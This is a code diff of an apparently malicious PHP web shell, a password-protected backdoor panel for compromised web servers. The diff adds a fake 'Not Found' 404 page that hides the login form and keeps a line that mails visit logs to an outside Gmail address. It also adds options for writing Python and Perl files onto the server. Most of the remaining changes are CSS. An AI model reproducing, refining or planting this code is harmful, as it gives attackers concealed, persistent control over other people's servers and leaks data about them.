@@ -8,6 +8,8 @@ ignore_user_abort(0);
 $password = "sad";
 function login() {
 ?>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="icon" href="https://img.icons8.com/ios/500/ghost.png" sizes="32x32">
 <style type="text/css">
   @import url('https://fonts.googleapis.com/css?family=Ubuntu+Mono&display=swap');
   div.login {
@@ -23,6 +25,10 @@ function login() {
     outline:none;
   }
 </style>
+<h1>Not Found</h1>
+  <p>The request URL <?=$_SERVER['REQUEST_URI']?> was not found on this server.</p>
+  <hr>
+  <address><?=$_SERVER['SERVER_SOFTWARE']?> Server at <?=$_SERVER['HTTP_HOST']?> Port <?=$_SERVER['SERVER_PORT']?></address>
 <div class="login">
   <center>
   <form method="post">
@@ -49,9 +55,6 @@ if (!isset($_SESSION[md5($_SERVER['HTTP_HOST']) ])) {
             Filename : ".$uri."\n
             URL : ".$ref."\n";
     @mail('xnonhack@gmail.com', 'Log', $log);
-    $fp = fopen("log.txt", "a"); 
-    fputs($fp, $log); 
-    fclose($fp); 
   } else {
     @login();
   }
@@ -78,7 +81,7 @@ table {
   border-collapse: separate;
   border-spacing: 0;
   border: 25px solid #fff;
-  width: 85%;
+  width: 95%;
   margin: 50px auto;
   border-radius: 20px;
   box-shadow: 0px 0px 0px 6px rgba(222,222,222,0.73);
@@ -107,10 +110,10 @@ tr.hover:hover {
   background-color: #dedede;
   cursor: default;
 }
-
 tbody tr:last-child td {
   border: none;
 }
+
 
 tbody td {
   border-bottom:none;
@@ -162,9 +165,10 @@ input[type=text] {
   margin-top:10px;
   margin-bottom:10px;
   color:#8a8a8a;
-  border-radius:20px;
-  border:1px solid rgba(222,222,222,0.73);
-  background:rgba(222,222,222,0.73);
+  border-bottom:3px solid rgba(222,222,222,0.73);
+  border-top:none;
+  border-left:none;
+  border-right:none;
 }
 select {
   font-family: 'Ubuntu Mono', monospace;
@@ -174,10 +178,10 @@ select {
   margin-bottom:10px;
   padding:7px 20px;
   outline:none;
-  color:#8a8a8a;
-  border-radius:20px;
-  border:1px solid rgba(222,222,222,0.73);
-  background:rgba(222,222,222,0.73);
+  border-bottom:3px solid rgba(222,222,222,0.73);
+  border-top:none;
+  border-left:none;
+  border-right:none;
 }
 a {
   color: #8a8a8a;
@@ -207,9 +211,7 @@ a:hover {
   border-color: #dd6864;
   color: #9f2723;
 }
-input:focus,
 textarea:focus,
-select:focus,
 th.line {
   border:1px solid #dedede;
 }
@@ -219,8 +221,7 @@ th.line {
   margin-bottom:-6px;
   margin-left:-8px;
 }
-textarea:hover, 
-input[type=text]:hover, 
+textarea:hover,  
 a.tools:hover, 
 a.back:hover,
 select:hover, 
@@ -228,6 +229,21 @@ input[type=submit]:hover {
     cursor:pointer;
     border:1px solid red;
     text-decoration:none;
+}
+select:focus,
+input:focus {
+  background:rgba(222,222,222,0.73);
+  border-left:none;
+  border-right:none;
+  border-top:none;
+  border-bottom: 3px solid red;
+}
+select:hover, 
+input[type=text]:hover {
+  border-left:none;
+  border-right:none;
+  border-top:none;
+  border-bottom:3px solid red;
 }
 table.back {
   background:none;
@@ -706,12 +722,18 @@ function making($post) {
           case 'js':
             $_mode = "js";
             break;
+          case 'python':
+            $_mode = "py";
+            break;
+          case 'perl':
+            $_mode = "pl";
+            break;
         }
         if (@makefile($_POST['filename'].".".$_mode, $_POST['text'])) {
           ?>
           <tr>
             <td colspan="2">
-              <?php print @failed("Create File ".$_POST['filename']." Failed") ?>
+              <?php print @failed("Create File <b>".$_POST['filename'].".".$_mode."</b> Failed") ?>
             </td>
           </tr>
           <?php
@@ -719,7 +741,7 @@ function making($post) {
           ?>
           <tr>
             <td colspan="2">
-              <?php print @success("Create File ".$_POST['filename']." Successfully") ?>
+              <?php print @success("Create File <b>".$_POST['filename'].".".$_mode."</b> Successfully") ?>
             </td>
           </tr>
           <?php
@@ -767,6 +789,8 @@ function making($post) {
             <option value="css">css</option>
             <option value="asp">asp</option>
             <option value="js">js</option>
+            <option value="python">python</option>
+            <option value="perl">pl</option>
           </select>
         </td>
         <td>
@@ -1066,7 +1090,7 @@ function killme($post) {
       <tr>
         <td colspan="5">
           <?php print @success("Good Bye :)") ?>
-          <meta http-equiv='refresh' content='1'>
+          <?php print @home() ?>
         </td>
       </tr>
       <?php
